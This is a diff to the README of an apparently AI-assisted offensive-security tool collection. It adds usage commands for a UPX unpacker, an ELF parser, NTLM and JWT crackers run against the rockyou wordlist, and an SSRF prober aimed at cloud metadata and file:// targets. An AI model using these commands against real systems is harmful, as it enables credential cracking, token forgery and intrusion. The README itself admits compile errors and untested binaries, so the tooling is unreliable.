@@ -290,6 +290,8 @@ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" user
 
 18. ICMP Tunnel
 
+- Script needs to be fixed. Lot of compile errors.
+
 <pre>
 # On both machines (requires root)
 sudo gcc icmp-tunnel.c -o icmp-tunnel -lpcap -pthread
@@ -346,9 +348,84 @@ curl --socks5 localhost:1080 http://10.10.10.10
 proxychains -q nmap -sT 172.16.0.0/24
 </pre>
 
-> P.S. I just can't sit idle and do nothing. I need to have something going on to keep myself busy. For this project, I used Grok because of unrestricted tokens, no rate limits and premium subscription required. This project has been birthed during Thanksgiving weekend. I hope everyone is thankful for the contributions made in this project :)
+21. UPX Unpacker
+
+<pre>
+# Build the unpacker
+gcc -O2 tiny-upx-unpacker.c -o upx-unpack -lm
+
+# Pack something with UPX
+upx --best malware
+
+# Unpack it with our tiny tool
+./upx-unpack malware unpacked-malware
+
+# Verify it works
+./unpacked-malware
+</pre>
+
+22. ELF Parser
+
+<pre>
+gcc -O2 tiny-elf-parser.c -o elfparse
+./elfparse /bin/ls
+./elfparse /lib/x86_64-linux-gnu/libc.so.6
+./elfparse malware-packed-elf
+</pre>
+
+23. NTLM Hash Cracker
+
+<pre>
+gcc -O3 -march=native turbo-ntlm-cracker.c -o ntlm-crack
+
+# Test speed (password123)
+time ./ntlm-crack 8846f7eaee8fb117ad06bdd830b7586c password123
+# → Found in <0.001 sec
+
+# Crack with rockyou
+./ntlm-crack 31d6cfe0d16ae931b73c59d7e0c089c0 /usr/share/wordlists/rockyou.txt
+</pre>
+
+24. JWT Cracker
+
+<pre>
+# Install OpenSSL dev (once)
+sudo apt install libssl-dev    # Debian/Ubuntu/Kali
+
+# Compile
+gcc -O3 turbo-jwt-cracker.c -o jwt-crack -lcrypto
+
+# 1. Just show "none" exploit
+./jwt-crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4
+
+# 2. Test known secret
+./jwt-crack eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ signature secret123
+
+# 3. Brute-force with rockyou
+./jwt-crack eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c /usr/share/wordlists/rockyou.txt
+</pre>
+
+25. SSRF Ping
+
+<pre>
+gcc -O2 ssrf-ping.c -o ssrf-ping
+
+# Manual mode (press Enter between tests)
+./ssrf-ping "http://vulnerable-app.com/fetch?url={{URL}}"
+
+# Auto mode
+./ssrf-ping "http://target/api/proxy?url={{URL}}" -a
+
+# Blind SSRF with delay
+./ssrf-ping "http://target/ping?host={{URL}}" --delay 1200
+
+# Test file:// + cloud metadata
+./ssrf-ping "http://ssrf-lab/fetch?url={{URL}}"
+</pre>
+
+All tools have been covered.
 
 ### TODO
 
-- Compile and test all binaries on a Linux system. I have Asahi Linux partitioned hard drive with a dual-boot setup on macOS. I was thinking of reinstalling Kali, but I am not an ethical hacker, and the focus of this project is on security tooling, improvements, and further optimizations.
-- For tunneling and pivoting tools, I would just just test it locally on different ports on a single machine.
+- Compile and test all binaries on a Linux system. I have partitioned hard disk drive and installed Asahi Linux with a dual-boot setup on macOS. I was thinking of reinstalling Kali, but I am not an ethical hacker, and the focus of this project is on security tooling, improvements, and further optimizations.
+- Tunneling and pivoting tools to be tested locally on different ports for ease of use.
